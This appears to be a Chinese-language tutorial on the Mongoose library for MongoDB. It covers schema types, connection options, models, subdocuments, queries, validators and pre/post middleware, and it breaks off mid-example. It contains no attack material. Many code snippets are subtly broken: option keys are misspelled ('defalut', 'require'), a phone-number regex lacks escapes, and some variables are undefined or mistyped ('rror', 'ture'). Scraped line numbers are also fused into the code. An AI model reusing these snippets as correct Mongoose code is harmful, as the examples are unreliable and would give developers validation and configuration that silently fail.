Schema.Types.ObjectId 123const mongoose = require('mongoose');const ObjectId = mongoose.Schema.Types.ObjectId;const Car = new Schema(&#123;driver:ObjectId&#125;); Arrays 创造 SchemaTypes 或者子文档数组 1234567const ToySchema = new Schema(&#123;name:String&#125;);const ToyBox = new Schema(&#123; toys:[ToySchema], buffers:[Buffer], string:[String]， number:[Number]&#125;); 注意：指定空数组相当于 Mixed,下面的操作相当于创建 Mixed数组： 1234const Empty1 = new Schema(&#123;ary:&#123;]&#125;&#125;);const Empty2 = new Schema(&#123;any:Array&#125;);const Empty3 = new Schema(&#123;any:[Schema.Types.Mixed]&#125;);const Empty4 = new Schema(&#123;any:[&#123;&#125;]&#125;); 数组的默认值是 []（空数组） 12const Toy = mongoose.model('Test',toySchema);new Toy().toys // [] 要手动把默认值设置为 undefined，从而覆盖 [] 123456const ToySchema = new Schema(&#123; toys:&#123; type:[ToySchema], defalut:undefined &#125;&#125;); 创建自定义 TypeMongoose 可以扩展自定义 SchemaType. schema.path()函数 这个函数为给定字段路径返回实例化 schema type 12345678910const sampleSchema = new Schema(&#123;name:&#123;type:String,require:true&#125;&#125;);sampleSchema.path('name');/*** SchemaString &#123; * enumValues: [], * regExp: null, * path: 'name', * instance: 'String', * validators: ...*/ 这个函数可以检查给定字段路径的检查器和类型等信息。 连接（Connections）可以使用 mongoose.connect()方法连接 MongoDB 1mongoose.connect('mongodb://localhost/myapp'); 这是连接本地 myapp数据库默认接口（27017）的最小配置。本地连接失败可以尝试 127.0.0.1.local hostname 被修改有时候会引起问题。 可以在 url 中指定多个参数： 1mongoose.connect('mongodb://username:password@host:port/database?options'); 操作缓存不必等等连接建立成功就可以使用 Mongoose models 12345mongoose.connect('mongodb://localhost/myapp');const MyModel = mongoose.model('Test',new Schema(&#123;name:String&#125;));MyModel.findOne(function(err,res)&#123; // ...&#125;); Mongoose 会缓存 model 操作。这个操作很方便，但也会引起一些疑惑，因为如果没有连上的话，Mongoose 不会抛错。 1234567const MyModel = mongoose.model('Test',new Schema(&#123;name:String&#125;));MyModel.findOne(function(err,res)&#123; // ..&#125;);setTimeout(function()&#123; mongoose.connect('mongodb://localhost/xxx');&#125;,6000); 要禁用缓存，修改 bufferCommands 配置。如果打开了这个选项连接被挂起，尝试关闭 bufferCommands 检查是否正确打开连接，也可以全局禁用 bufferCommands: 1mongoose.set('bufferCommands',false); 选项connect 方法也接受 options 参数，这些参数会传入底层 MongoDB 驱动 1mongoose.connect(uri,options); Mongoose 会不做修改直接把选项传到驱动，以下有一点例外 bufferCommands 是 mongoose 特有的选项， user/pass 用于认证的用户名和密码。mongoose 特有的，等价于 MongoDB 驱动的 auth.user 和 auth.password选项 autoIndex 理想情况下，mongoose 在连接时会自动建立 schema 索引。这有利于开发，但是在大型生产环境中不是很理想，因为会导致性能下降。 dbName 指定要连接的数据库名称（覆盖连接字符串） 下面是一些重要的选项 autoReconnect 底层 MongoDB 驱动在连接后将自动重连。除非是管理连接池的高手，不然不建议设置为 false bufferMaxEntries MongoDB 驱动同样有自己的离线缓存机制。如果希望连接错误时终止数据库操作，可以设这个值为 0 以及把 bufferCommands 设为 false. promiseLibrary 设置底层 promise 库 poolSize MongoDB 保持的最大 socket 连接数。默认是5.MongoDB 3.4 之前，只允许每个 socket 同时进行一个操作，所以如果有几个缓慢请求卡着后面快的请求，可以尝试增加连接数。 举例子： 123456789const options = &#123; useMongoClient:true, autoIndex:false, // 不要创建索引 reconnectTries:Number.MAX_VALUE, // 不要停止重连 reconnectInterval:500, // 每500毫秒重连 poolSize:10, // 维护最多10个socket bufferMaxEntries:0 // 如果没有连接，则立即返回错误，而不是等待重新连接&#125;mongoose.connect(uri,options); 回调connect 函数接受回调函数，或者返回一个 promise 1234567mongoose.connect(uri,options,function(error)&#123; &#125;);mongoose.connect(uri,options).then( ()=&gt;&#123;/** ready to use. The `mongoose.connect()` promise resolves to undefined. */ &#125; err=&gt;&#123;/** handle initial connection error */&#125;); 连接字符串（Connectng String）选项可以在连接字符串填写驱动选项，这只适用于 MongoDB 驱动使用的选项，所以类似 bufferCommands 的 Mongoose 专用选项不能在连接字符串使用 123456mongoose.connect('mongodb://localhost:27017/test?connectTimeoutMS=1000&amp;bufferCommands=false');// 相当于mongoose.connect('mongodb://localhost:27017/test', &#123; connectTimeoutMS: 1000 // Note that mongoose will **not** pull `bufferCommands` from the query string&#125;); 把选项放在连接字符串的劣势是不便阅读。优势是简短。最佳实践是把区分生产环境和开发环境的选项，socketTimeoutMS 、 connectTimeoutMS 放在 uri ， 把通用的常量如 connectTimeoutMS 、 poolSize 放在选项对象里。 keepAlive注意事项对于长期运行的后台引用，启用毫秒级 keepAlive是一个精明的操作。不这么做偶尔会经常收到看似没有什么原因的 connection closed 错误 1mongoose.connect(uri,&#123;keepAlive:120&#125;); 副本集（Replica Set）连接要连接到副本集，可以使用逗号分隔开，传入多个地址： 1mongoose.connect('mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]' [, options]); 连接到单节点副本集，需要指定 relicaSet 选项 1mongoose.connect('mongodb://host1:port1/?replicaSet=rsName'); 多 mongos 支持使用高性能分片集群，需要连接多个 mongos（MongoDB Shard） 实例。 在 mongoose 5.x 中， 你在连接多个 mongos 时不需要传入任何特殊选项。 12// Connect to 2 mongos serversmongoose.connect('mongodb://mongosA:27501,mongosB:27501', cb); 多个连接之前我们了解如何使用 Mongoose 默认连接方法连接到 MongoDB。但有时候我们需要权限不同的多个连接， 或是连接到不同数据库。这个情况下我们可以使用 mongoose.createConnection()， 它接受之前提到的所有参数，给你返回一个新的连接。 1const conn = mongoose.createConnection('mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]', options); connection对象后续用于创建和检索models。 models 的范围总是局限于单个连接。 调用 mongoose.connect() 时，Mongoose 会自动创建默认连接。 你可以使用 mongoose.connection 访问默认连接。 连接池无论是使用 mongoose.connect 或是 mongoose.createConnection 创建的连接， 都被纳入默认最大为 5 的连接池，可以通过 poolSize 选项调整： 12345// With object optionsmongoose.createConnection(uri, &#123; poolSize: 4 &#125;);const uri = 'mongodb://localhost/test?poolSize=4';mongoose.createConnection(uri); 模型（Models）Models 是从 Schema 编译来的构造函数，它们的实例就代表着可以从数据保存和读取 documents，从数据创建和读取 document 的所有操作都是通过 model 进行的。 12const schema = new Schema(&#123;name:'string',size:'string'&#125;);const Tank = mongoose.model('Tank',schema); 第一个参数是跟 model 对应的集合（collection） 名字的单数形式。Mongoose 会自动找到名称是 model 名字复数形式的 collection。对于上例，Tank 这个model 就对应 数据库中 tanks 这个 collection..model() 这个函数是对 schema 做了拷贝（生成了model）。要确保在调用 .model() 之前把所有需要的东西都加进去 schema里面。 构造 documentsDocuments 是 model 的实例，创建它们并保存到数据库非常简单： 123456789const Tank = mongoose.model('Tank',yourSchema);const small = new Tank(&#123;size:'small'&#125;);small.save(function(err)&#123; if(err) return handleError(err);&#125;);Tank.create(&#123;size:'small'&#125;,function(err,small)&#123; if(err) return handleError(err);&#125;); 要注意，知道 model 使用的数据连接（connection）被打开，tanks 才会被创建/删除，每个 model 都有一个绑定的连接。如果model 是通过调用 mongoose.model() 生成的，它将使用 mongoose 的默认连接。 1mongoose.connect('localhost','gettingstarted') 如果自行创建了连接，就需要使用 connection 的 model函数代替 mongoose 的 model函数 12const connection = mongoose.createConnection('mongodb://localhost:27017/test');const Tank = connection.model('Tank',yourSchema); 查询用 mongoose 查询文档相当容易，它支持 mongoDB的高级查询语法（rich），查询文档可以使用 model的 find,findById,findOne,where 这些静态方法。 1Tank.find(&#123;size:'small'&#125;).where('createDate').gt(oneYearAgo).exec(callback); 删除model的 remove方法可以删除所有匹配查询条件的文档 123Tank.remove(&#123;size:'large'&#125;,function(err)&#123; if(err) return handleError(err);&#125;); 更新model的 update方法可以修改数据库中的文档，不过不会把文档返回给应用层。 如果想更新单独一条文档并且返回给应用层，可以使用 findOneAndIUpdate 方法 文档（Documents）Mongoose documents代表着MongoDB 文档的一对一映射，每个 document 都是他的 Model 实例。 检索MongoDB 有很多检索数据的方法。 更新Document 更新的方法同样也有很多,最基本的 findById 12345678Tank.findById(id,function(err,tank)&#123; if(err) return handleError(err); tank.size = 'large'; tank.save(function(err,updateTank)&#123; if(err) return handleError(err); res.send(updateTank); &#125;);&#125;); 也可以用 .set() 修改 document 。在底层，tank.size = &#39;large&#39;，用 tank.set({size:&#39;large&#39;}) 12345678Tank.findById(id,function(err,tank)&#123; if(err) return handleError(err); tank.set(&#123;size:'large'&#125;); tank.save(function(err,updateTank)&#123; if(err) return handleError(err); res.send(updateTank); &#125;);&#125;); 这个方法先检索了数据，接着更新（使用了save）。如果我们仅仅需要更新而不是获取该数据，model#update就很适合我们： 1Tank.update(&#123;_id:id&#125;,&#123;$set:&#123;size:'large'&#125;&#125;,callback); 如果我们确实需要返回文档，下面的方法更加适合： 1234Tank.findByIdAndUpdate(id,&#123;$set:&#123;size:'large'&#125;&#125;,&#123;new:true&#125;,function(err,tank)&#123; if(err) return handleError(err); res.send(tank);&#125;); findAndUpdate/Remove系列静态方法查找并返回最多1个文档，模式的方法有不少。 注意：findAndUpdata/Remove不会修改数据库时执行任何钩子或者验证。可以使用 runValidators 选项获取一个验证的限制子集。但是需要钩子和全文档验证的，还是先query 在save 验证Document 会在被保存之前验证。 覆盖可以用 .set() 覆盖整个文档。如果要修改在中间件中被保存的文档，这样就很方便了。 12345Tank.findById(id,function(err,tank)&#123; if(err) return handleError(); // otherTank 是 tank 的副本 otherTank.set(tank)&#125;); 子文档（Subdocuments）子文档是指嵌套在另一个文档中的文档。在 Mongoose 中，这意味着可以在 里面嵌套一个 schema 。Mongoose 子文档有两种不同的概念：子文档数组和单个嵌套子文档。 123456const childSchema = new Schema(&#123;name:'string'&#125;);const parentSchema = new Schema(&#123; children:[childSchema], // Single nested subdocuments. Caveat: single nested subdocs only work in mongoose &gt;= 4.2.0 child:childSchema&#125;) 子文档和普通 docuemnt 类似。嵌套 schema 可以有自己的中间件，自定义检索逻辑、虚拟值已经其他顶层 schemas 可用的特性，两者主要的不同点是子文档不能单独保存，他们会在他们的顶级文档保存时保存。 12345const Parent = mongoose.model('Parent',parentSchema);const parent = new Parent([children:[&#123;name:'Matt'&#125;,&#123;name:'Sarah'&#125;]]);parent.children[0].name = 'HaHa';// parent.children[0].save() 无操作，虽然他触发了中间件，但是没有保存文档，需要 save 他的文档、parent.save(callback); 子文档跟普通文档一样有 save 和 validate 中间件，调用福文档的 save 会触发所有子文档的 save 中间件， validate 中间件同理。 12345678910childSchema.pre('save',function(next)&#123; if('invalid' == this.name)&#123; return next(new Error('#sadpanda')) &#125; next();&#125;);const parent = new Parent(&#123;children:[&#123;name:'invalid'&#125;]&#125;);parent.save(function(err)&#123; console.log(err.message); //#sadpanda&#125;); 子文档的 pre(&#39;save&#39;) 和 pre(&#39;validate&#39;)中间件执行于顶层 document pre(&#39;save&#39;) 之前，顶层 document 的 pre(&#39;validate&#39;)之后。因为 save()前的验证就是一个中间件。 1234567891011121314151617181920212223const childSchema = new mongoose.Schema(&#123;name:'string'&#125;);childSchema.pre('validate',function(next)&#123; console.log(2); next();&#125;);childSchema.pre('save',function(next)&#123; console.log(3); next();&#125;);const parentSchema = new mongoose.Schema(&#123; child:childSchema&#125;);parentSchema.pre('validate',function(next)&#123; console.log(1); next();&#125;);parentSchema.pre('save',function(next)&#123; console.log(4); next();&#125;);// 1 2 3 4 查找子文档每个子文档都有一个默认 _id，Mongoose document 数组有一个特别的 id 方法，这个方法只要传入 _id就能返回文档数组中特定文档。 1const doc = parent.children.id(_id); 添加子文档到数组Mongoose 数组方法有 push、unshift、addToSet 等等： 123456789101112const Parent = mongoose.model('Parent');const parent = new Parent;parent.children.push(&#123;name:'Haha'&#125;);const subdoc = parent.children[0];subdoc; // _id: '501d86090d371bab2c0341c5', name: 'Haha' &#125;subdoc.isNew; // trueparent.save(function(err)&#123; if(err) return handleError(err); console.log('Success');&#125;); create 方法可以新建文档但是不加入数组 1const newdoc = parent.children.create(&#123;name:'Haha'&#125;); 删除子文档每个子文档都有 remove 方法，另外，对于子文档数组，有一个等效的方法.pull()。对于单个嵌套子文档，remove 与把这个文档的值设为 null 等效。 12345678// 等效 parent.children.pull(_id)parent.children.id(_id).remove()// 或者 parent.child = nullparent.child.remove();parent.save(function(err)&#123; if(err) return handleError(err); console.log('the subdocs were removed');&#125;); 代替声明语法的写法 如果用对象的数组创建 schema,mongoose 会自动把对象转成 schema： 1234567const parentSchema = new Schema(&#123; children:[&#123;name:'string'&#125;]&#125;)// 等价于const parentSchema = new Schema(&#123; children:[new Schema(&#123;name:'string'&#125;)]&#125;); 查询（queries）Model 的多个静态辅助方法都可以查询文档。 Model 的方法中包含查询条件参数的（find findById count update）都可以按照下面两种方式执行： 传入 callback 参数，操作会被立即执行，查询结果被传给回调函数（callback） 不传 callback 参数，Query 的一个实例（一个 query对象）被返回，这个 query 提供了 构建查询器的特殊接口。 Query 实例有一个 .then()函数，用法类似 promise 如果执行查询时传入 callback,就需要用 JSON 文档的格式指定查询条件，JSON 文档的语法跟 MongoDB shell 一致。 1234567const Parent = mongoose.model('Person',mySchema);// 查询 last name 是 haha 的 person,选中 name 和 occupation 字段Person.findOne(&#123;'name.last':'haha'&#125;,'name occupation',function(err,person)&#123; if(err) return handleError(err); console.log(person.name.first,person.name.last,person.occupation);&#125;); 上面的查询被立即执行，查询结果被传入回调函数。Mongoose 中所有的调用函数都是用 callback(error,result)这种模式。如果查询发生错误，error参数即是错误文档，result参数会是 null。如果查询成功，error参数是 null，result即是查询结果。 查询结果的格式取决于做什么操作：findOne() 是单个文档（或者null），find() 是文档列表，count() 是文档数量， update() 是被修改的文档数量。 下面看看不传入 callback 这个参数会是怎么样的： 12345678910// 查找每个 last name 是 haha 的 personconst query = Person.findOne(&#123;'name.last':'haha'&#125;);// 选择 name 和 occupation 字段query.select('name occupation');// 然后执行查询query.exec(function(err,person)&#123; if(err) return handleError(err); console.log(person.name.first,person.name.last,person.occupation);&#125;); 上面的代码中，query 是 Query 类型的变量，Query 能够用链式语法构建查询器，无需要执行 JSON 对象。下面2个实例等效： 1234567891011121314151617Person.find(&#123; occupation:/host/, 'name.last':'haha', age:&#123;$gt:17,$lt:66&#125;, likes:&#123;$in:['vaporizing','talking']&#125;&#125;).limit(10).sort(&#123;occupation:-1&#125;).select(&#123;name:1,ouccupation:1&#125;).exec(callback);Person.find(&#123;occupation:/host/&#125;).where('name.last').equals('haha').where('age').gt(17).lt(66).where('likes').in(['vaporizing','talking']).limit(10).sort('-occupation').select('name occupation').exec(callback) 引用其他文档MongoDB 中没有表连接，但引用其他结合的文档有时候也会需要。population 就是这样当升的。 Streaming 可以用 流式处理 MongoDB 的查询结果，需要调用 Query.cursor() 函数获得 QueryCursor 的一个实例： 1234const cursor = Person.find(&#123;occupation:/host/&#125;).cursor();cursor.on('data',function(doc)&#123;/**Called once for every document*/&#125;);cursor.on('close',function()&#123;/**Called when done*/&#125;); 验证（validation）需要先注意下面几点： 验证定义于 SchemaType 验证是一个中间件，它默认作为 pre(save)钩子注册在 schema 上 可以使用 doc.validate(callback)或者 doc.validateSync()手动验证 验证器不对未定义的值进行验证，唯一例外就是 require 验证器 验证是异步递归的。当调用 Model#save,子文档也会执行，出错的话 Model#save 回调会接受错误 验证是可以定制的。 1234567891011121314const schema = new Schema(&#123; name:&#123; type:String, require:true &#125;&#125;)const Cat = db.model('Cat',schema);const cat = new Cat();cat.save(function(err)&#123; assert.equal(error.errors['name'].message,'Path `name` is required.'); error = cat.validateSync(); assert.equal(error.errors['name'].message,'Path `name` is required.')&#125;); 内建 ValidatorsMongoose 有一些内建验证器 所有 SchemaTypes 都有内建的 required 验证器。required 验证器使用 checkRequired（）函数判定这个值是否满足 required 验证器 Numbers 有 min 和 max 验证器 String 有 enum、match、maxlength 和 minlength 验证器 上面的链接提供了使用和错误处理相关的详细信息。 1234567891011121314151617181920212223242526272829303132333435363738const breakfastSchema = new Schema(&#123; eggs:&#123; type:Number, min:[6,'Too few eggs'], max:12 &#125;, bacon:&#123; type:Number, required:[true,'Why no bacon'] &#125;, drink:&#123; type:String, enum:['Coffee','Tea'], required:function()&#123; return this.bacon &gt; 3; &#125; &#125;&#125;);const Breakfast = db.model('Breakfast',breakfastSchema);const badBreakfast = new Breakfast(&#123; eggs:2, bacon:0, drink:'Milk'&#125;);const error = badBreakfast.validateSync();assert.equal(error.errors['eggs'].message,'Too few eggs');assert.ok(!error.errors['bacon']);assert.equal(error.errors['drink'].message,'`Milk` is not a valid enum value for path `drink`');badBreakfast.bacon = 5;badBreakfast.drink = null;error = badBreakfast.validateSync();assert.equal(error.errors['drink'].message,'Path `drink` is required');badBreakfast.bacon = null;error = badBreakfast.validateSync();assert.equal(error.errors['bacon'].message,'Why no bacon'); unique不是验证器它是构建 MongoDB unique indexes 的辅助函数 12345678910111213141516171819202122232425262728293031const uniqueUsernameSchema = new Schema(&#123; username:&#123; type:String, unique:true &#125;&#125;)const U1 = db.model('U1',uniqueUsernameSchema);const U2 = db.model('U2',uniqueUsernameSchema);const dup = [&#123;username:'Val'&#125;,&#123;username:'val'&#125;]U1.create(dup,function(err)&#123;&#125;);// 在保存之前需要等待索引完成构建，否则可能会违反惟一的约束。U2.once('index',function(err)&#123; assert.ifError(err); U2.create(dup,function(err)&#123; // 重复键错误 assert.ok(err); assert.ok(!err.errors); assert.ok(error.message.indexOf('duplicate key error') != -1); &#125;);&#125;);U2.init().then(function()&#123; U2.create(dup,function(err)&#123; // 重复键错误 assert.ok(err); assert.ok(!err.errors); assert.ok(error.message.indexOf('duplicate key error') != -1); &#125;); &#125;); 自定义验证器如果内建检验器不够用了，可以定义满足自己需要的验证器 自定义验证器通过传入一个验证函数来定义 12345678910111213141516171819202122232425262728const userSchema = new Schema(&#123; phone:&#123; type:String, validate:&#123; validator:function(v)&#123; return /\d&#123;3&#125;-d&#123;3&#125;-d&#123;4&#125;/.test(v); &#125;, message:'&#123;VALUE&#125; is not a valid phone number!' &#125;, required:[true,'User phone number required'] &#125;&#125;);const User = db.model('user',userSchema);const user = new User();let error;user.phone = '555.0123';error = user.validateSync();assert.equal(error.errors['phone'].message,'555.0123 is not a valid phone number!');user.phone = '';rror = user.validateSync();assert.equal(error.errors['phone'].message,'User phonse number required!');user.phone = '201-555-0123';rror = user.validateSync();assert.equal(error,null); 异步自定义验证器自定义验证器可以是异步的，如果检验函数返回 promise (像 async函数)，mongoose 将会等待该 promise 完成。如果更喜欢使用回调函数，设置 isAsync选项，mongoose 会将回调函数作为验证函数的第二个参数。 123456789101112131415161718192021222324252627282930313233343536373839404142const userSchema = new Schema(&#123; name:&#123; type:String, // 可以通过返回一个promise使验证器异步。如果返回一个promise，不要指定' isAsync '选项。 validate:function(v)&#123; return new Promise(function(resolve,reject)&#123; setTimeout(function()&#123; resolve(false) &#125;,5); &#125;); &#125; &#125;, phone:&#123; type:String, validate:&#123; isAsync:true, validator:function(v,cb)&#123; setTimeout(function()&#123; const phoneRegex = /\d&#123;3&#125;-d&#123;3&#125;-d&#123;4&#125;/; const msg = v + 'is not a valid phone number!'; // 第一个参数是布尔值代表验证结果 // 第二个参数是报错信息 cb(phoneRegex.test(v),msg); &#125;,5); &#125;, // 默认报错信息会被 cb 的第二个参数覆盖 message:'Default error message' &#125;, required:[true,'User phone number required'] &#125;&#125;);const User = db.model('User',userSchema);const user = new User();let error;user.phone = '555.0123';user.name = 'test';user.validate(function(error)&#123; assert.ok(error); assert.equal(error.errors['phone'].message,'555.0123 is not a valid phone number!'); assert.equal(error.errors['name'].message,'Validator failed for path `name` with value `test`');&#125;); 验证错误验证失败返回 的err 包含一个 ValidatorError对象。每一个 ValidatorError 都有 kind、path、value 和 message 属性。ValidatorError 也有可能有 reason 属性如果验证器抛出错误，这个属性会包含该错误原因。 1234567891011121314151617181920212223242526272829const toySchema = new Schema(&#123; color:String, name:String&#125;);const validator = function(v)&#123; return /red|white|gold/i.test(v);&#125;toySchema.path('color'）.validate(validator,'Color `&#123;VALUE&#125;` not valid','Invalid color');toySchema.path('name').validate(function(v)&#123; if(v !== 'Turbo Man')&#123; throw new Error('Need to get a Turbo Man for Christmas'); &#125; return ture;&#125;,'Name `&#123;VALUE&#125;` is not valid');const Toy = db.model('Toy',toySchema);const toy = new Toy(&#123;color:'Green',name:'Power Ranger'&#125;);toy.save(function(err)&#123; assert.equal(err.errors.color.message, 'Color `Green` not valid'); assert.equal(err.errors.color.kind, 'Invalid color'); assert.equal(err.errors.color.path, 'color'); assert.equal(err.errors.color.value, 'Green'); assert.equal(err.errors.name.message,'Need to get a Turbo Man for Christmas'); assert.equal(err.errors.name.value, 'Power Ranger'); assert.equal(err.errors.name.reason.message,'Need to get a Turbo Man for Christmas'); assert.equal(err.name, 'ValidationError'); &#125;); 嵌套对象中的 Required 验证器定义嵌套对象的验证器需要特别注意 12345678910111213141516171819202122232425262728293031let personSchema = new Schema(&#123; name:&#123; first:String, last:String &#125;&#125;);assert.throws(function()&#123; // 这里会报错，因为 name 不是完整路径 personSchema.path('name').required(true);&#125;);// 要让嵌套对象 required 要使用单独的嵌套 schemaconst nameSchema = new Schema(&#123; name:&#123; type:nameSchema, required:true &#125;&#125;);personSchema = new Schema(&#123; name:&#123; type:nameSchema, required:true &#125;&#125;);const person = db.model('Person',personSchema);const person = new Person();const error = person.validateSync();assert.ok(error.errors['name']); Update 验证器Mongoose 还支持验证 update() 和 findOneAndUpdate() 操作，Update 验证器默认关闭，如果需要打开，需要配置 runValidators 123456789101112131415const toySchema = new Schema(&#123; color: String, name: String&#125;);const Toy = db.model('Toys', toySchema);Toy.schema.path('color').validate(function (value) &#123; return /blue|green|white|red|orange|periwinkle/i.test(value);&#125;, 'Invalid color');const opts = &#123; runValidators: true &#125;;Toy.update(&#123;&#125;, &#123; color: 'bacon' &#125;, opts, function (err) &#123; assert.equal(err.errors.color.message,'Invalid color');&#125;); Update 验证器 与 thisupdate 验证器和 document 验证器有很多不同。上面的颜色验证函数，this 指向验证中的 document，然后update 验证器运行时，被更新文档不一定存在于服务器内存，所以 this 值未定义 123456789101112131415161718192021222324252627282930const toySchema = new Schema(&#123; color: String, name: String&#125;);toySchema.path('color').validate(function(value) &#123; // 在运行“validate()”或“validateSync()”时 // 验证器可以使用“this”访问文档。 if (this.name.toLowerCase().indexOf('red') !== -1) &#123; return value !== 'red'; &#125; return true;&#125;);const Toy = db.model('ActionFigure', toySchema);const toy = new Toy(&#123; color: 'red', name: 'Red Power Ranger' &#125;);const error = toy.validateSync();assert.ok(error.errors['color']);const update = &#123; color: 'red', name: 'Red Power Ranger' &#125;;const opts = &#123; runValidators: true &#125;;Toy.update(&#123;&#125;, update, opts, function(error) &#123; // The update validator throws an error: // "TypeError: Cannot read property 'toLowerCase' of undefined", // because `this` is **not** the document being updated when using // update validators assert.ok(error);&#125;); context选项context 选项运行把 update 验证器的 this 设定为 query 12345678910111213141516toySchema.path('color').validate(function(v)&#123; // When running update validators with the `context` option set to // 'query', `this` refers to the query object. if(this.getUpdate().$set.name.toLowerCase().indexOf('red') !== -1)&#123; return value == 'red' &#125; return true;&#125;);const Toy = db.model('Figure',toySchema);const update = &#123;color:'blue',name:'haha'&#125;// Note the context optionconst opts = &#123;runValidators:true,context:'query'&#125;Toy.update(&#123;&#125;,update,opts,function(error)&#123; assert.ok(error.errors['color']);&#125;); Update 验证器字段路径另一个关键不同点是 update 验证器只运行于更新的字段。 下例中，因为 ‘name’ 在更新操作未被指定，所以此次更新操作成功。 使用 update 验证器的时候， required 验证器只会在你对某个字段显式使用 $unset 才会触发。 12345678910111213141516171819const kittenSchema = new Schema(&#123; name: &#123; type: String, required: true &#125;, age: Number&#125;);const Kitten = db.model('Kitten', kittenSchema);const update = &#123; color: 'blue' &#125;;const opts = &#123; runValidators: true &#125;;Kitten.update(&#123;&#125;, update, opts, function(err) &#123; // 即使 'name' 没有指定也操作成功了&#125;);const unset = &#123; $unset: &#123; name: 1 &#125; &#125;;Kitten.update(&#123;&#125;, unset, opts, function(err) &#123; // 'name' required， 操作失败 assert.ok(err); assert.ok(err.errors['name']);&#125;); Update 验证器只运行于指定字段路径最后要注意的是：update 验证器只运行于下列更新操作： $set $unset $push (&gt;= 4.8.0) $addToSet (&gt;= 4.8.0) $pull (&gt;= 4.12.0) $pullAll (&gt;= 4.12.0) 例如，以下 update 成功执行，不管 number 的值，因为 update 验证器 无视 $inc 。同样， $push、$addToSet、 $pull和 $pullAll 验证器 不会对数组自身验证，只会对数组中的元素验证。 12345678910111213141516171819202122const testSchema = new Schema(&#123; number: &#123; type: Number, max: 0 &#125;, arr: [&#123; message: &#123; type: String, maxlength: 10 &#125; &#125;]&#125;);// Update 验证器不会作检查，所以你再仍然可以 `$push` 两个元素到数组 // 只要他们的 `message` 没有超长testSchema.path('arr').validate(function(v) &#123; return v.length &lt; 2;&#125;);const Test = db.model('Test', testSchema);const update = &#123; $inc: &#123; number: 1 &#125; &#125;;const opts = &#123; runValidators: true &#125;;Test.update(&#123;&#125;, update, opts, function(error) &#123; // 这里不会报错 update = &#123; $push: [&#123; message: 'hello' &#125;, &#123; message: 'world' &#125;] &#125;; Test.update(&#123;&#125;, update, opts, function(error) &#123; // 这里也不会报错 &#125;);&#125;); \$push 和 \$addToSet4.8.0 新特性： update 验证器也运行于 $push 和 $addToSet 1234567891011121314151617181920const testSchema = new Schema(&#123; numbers: [&#123; type: Number, max: 0 &#125;], docs: [&#123; name: &#123; type: String, required: true &#125; &#125;]&#125;);const Test = db.model('TestPush', testSchema);const update = &#123; $push: &#123; numbers: 1, docs: &#123; name: null &#125; &#125;&#125;;const opts = &#123; runValidators: true &#125;;Test.update(&#123;&#125;, update, opts, function(error) &#123; assert.ok(error.errors['numbers']); assert.ok(error.errors['docs']);&#125;); 中间件（middleware）中间件（pre 和 post）是在异步函数执行时函数传入的控制函数。中间件在 Schema 上指定，在写插件时很有用。Mongoose 4.x 有四种中间件：document、model、aggregate、query 中间件。对于 document 中间件，this 指向当前的 document，Document 中间件支持下面的 document 操作： init validate save remove 对于 query中间件，this 指向 query。Query 中间件支持一下 Model 和 Query 操作： count find findOne findOneAndRemove findOneAndUpdate update Aggregate 中间件作用于 MyModel.aggregat(),它会在对 aggregate 对象调用 exec() 时执行。对于 aggregate 中间件，this 也是指向 aggregation 对象。 aggregate 对于 model 中间件来说，this 是指向当前的model.Model 中间件支持下面的操作： insertMany 所有的中间件支持 pre 和 post 钩子，下面解释这两个钩子的细节。 注意：Query 是没有 remove 钩子的，只有 document有，如果设定了 remove 钩子，将会在调用 myDoc.remove()而不是MyModel.remove 的时候触发。只有 create() 函数会触发 save() 钩子。 Prepre 钩子分为串行和并行两种。 串行 串行中间件一个接一个地执行，具体来说，上一个中间件调用 next 函数的时候，下一个执行。 12345const schema = new Schema(&#123;..&#125;);schema.pre('save',function(next)&#123; next();&#125;); 在 5.x 版本中，除了手动调用 next ，可以返回一个 promise ，甚至是 async/await。 12345678schema.pre('save',function()&#123; return doStuff().then(()=&gt;doMoreStuff())&#125;);// 或者 Node.js &gt;= 7.6.0:schema.pre('save',async function()&#123; await doStuff(); await doMoreStuff();&#125;); next() 不会阻止剩余代码的运行，可以使用提前 return 模式来阻止 next () 后面的代码。 12345678910const schema = new Schema(&#123;..&#125;);schema.pre('save',function(next)&#123; if(foo())&#123; console.log('calling next'); // `return next();` will make sure the rest of this function doesn't run next(); &#125; // Unless you comment out the `return` above, 'after next' will print console.log('after next');&#125;); 并行 并行中间件提供细粒度流控制 123456const schema = new Schema(&#123;..&#125;);// true 代表这是一个并行中间件，如果要使用并行中间件，必须指定 true 为第二个参数schema.pre('save',true,function(next,done)&#123; next(); setTimeout(done,100);&#125;); 上述的例子中，save 方法将在所有中间件都调用了 done 的时候才会执行。 使用场景： 中间件对原子化模型逻辑很有帮助，这里有一些其他建议： 复杂的数据校验 删除依赖文档（删除用户后删除其他所有文章） 某个操作触发的异步任务 错误处理： 如果 pre 钩子出错，momgoose 将不会执行后面的函数。Mongoose 会向回调函数传入 err 参数，或者 reject 返回的 promise 。下面是几个错误的处理的方法: 12345678910111213141516171819schema.pre('save',function(next)&#123; const err = new Error('something went gone'); next(err);&#125;);schema.pre('save',function(next)&#123; return new Promise((resolve,reject)=&gt;&#123; reject(new Error('something went gone')) &#125;);&#125;);schema.pre('save',async function()&#123; await Promise.resolve(); throw new Error('something went gone')&#125;);myDoc.save(function(err)&#123; console.log(err.message);&#125;); 多次调用 next 是无效的，如果调用 next 带有错误参数 err1 ，然后再抛出一个 err2，mongoose 只会传递 err1 Post中间件post 中间件在方法执行之后调用，这个时候每个 pre 中间件都已经完成了。 123456789101112schema.post('init', function(doc) &#123; console.log('%s has been initialized from the db', doc._id);&#125;);schema.post('validate', function(doc) &#123; console.log('%s has been validated (but not saved yet)', doc._id);&#125;);schema.post('save', function(doc) &#123; console.log('%s has been saved', doc._id);&#125;);schema.post('remove', function(doc) &#123; console.log('%s has been removed', doc._id);&#125;); 异步 Post 钩子如果给回调函数传入两个参数，mongoose 会认为第二个参数 next 函数，可以通过 next 触发下一个中间件 1234567891011schema.post('save',function(doc,next)&#123; setTimeout(function()&#123; console.log('post1'); next(); &#125;,10);&#125;);// 直到第一个中间件执行 next() 才会执行schema.post('save',function(doc,next)&#123; console.log('post2'); next();&#125;); Save/Validate钩子save() 函数触发 validate 钩子，mongoose validate() 其实就是 pre(‘save’)钩子，这意味着所有 pre(‘validate’) 和 post(‘validate’)都会在 pre(‘save’)钩子之前调用。 123456789101112131415schema.pre('validate',function()&#123; console.log('this gets printed first');&#125;);schema.post('validate', function() &#123; console.log('this gets printed 